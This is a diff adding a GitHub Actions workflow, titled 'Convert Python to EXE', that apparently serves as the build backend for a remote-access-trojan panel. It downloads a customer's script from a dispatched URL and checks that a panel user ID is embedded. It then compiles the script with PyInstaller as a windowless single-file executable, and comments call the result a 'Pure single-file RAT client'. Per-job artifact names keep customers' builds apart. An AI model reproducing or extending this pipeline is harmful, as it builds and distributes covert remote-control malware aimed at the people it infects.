@@ -1,0 +1,62 @@
+name: Convert Python to EXE
+
+on:
+  repository_dispatch:
+    types: [convert_file]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - uses: actions/checkout@v4
+
+    - uses: actions/setup-python@v5
+      with:
+        python-version: '3.10'
+
+    - name: Install deps
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller pycryptodome
+
+    - name: Download User File
+      shell: pwsh
+      run: |
+        $url = "${{ github.event.client_payload.file_url }}"
+        if (-not $url) { throw "missing file_url in client_payload" }
+        Invoke-WebRequest -Uri $url -OutFile "script.py"
+        # Sanity: must contain embedded panel USER (never leftover placeholder)
+        $txt = Get-Content -Raw "script.py"
+        if ($txt -match 'USER = "%USER%"') { throw "USER placeholder not replaced in source" }
+        if ($txt -notmatch 'USER = "') { throw "USER assignment missing in source" }
+        Write-Host "Source OK — panel user embedded"
+
+    - name: Download Icon (optional)
+      shell: pwsh
+      run: |
+        $icon = "${{ github.event.client_payload.icon_url }}"
+        if ($icon -and $icon.Trim() -ne "") {
+          Invoke-WebRequest -Uri $icon -OutFile "app.ico"
+          echo "HAS_ICON=1" >> $env:GITHUB_ENV
+        } else {
+          echo "HAS_ICON=0" >> $env:GITHUB_ENV
+        }
+
+    - name: Build EXE (pure client only — no binder/tool merge)
+      shell: pwsh
+      run: |
+        # Pure single-file RAT client. Do NOT add extra binaries or binders here.
+        if ($env:HAS_ICON -eq "1") {
+          pyinstaller --onefile --noconsole --name script --clean --icon=app.ico --hidden-import=Crypto --hidden-import=Crypto.Cipher.AES script.py
+        } else {
+          pyinstaller --onefile --noconsole --name script --clean --hidden-import=Crypto --hidden-import=Crypto.Cipher.AES script.py
+        }
+        if (-not (Test-Path "dist/script.exe")) { throw "EXE not produced" }
+
+    - name: Upload artifact (unique per job_id)
+      uses: actions/upload-artifact@v4
+      with:
+        # CRITICAL: include job_id so the panel never grabs another user's EXE
+        name: converted_exe_${{ github.event.client_payload.job_id }}
+        path: dist/script.exe
+        retention-days: 1
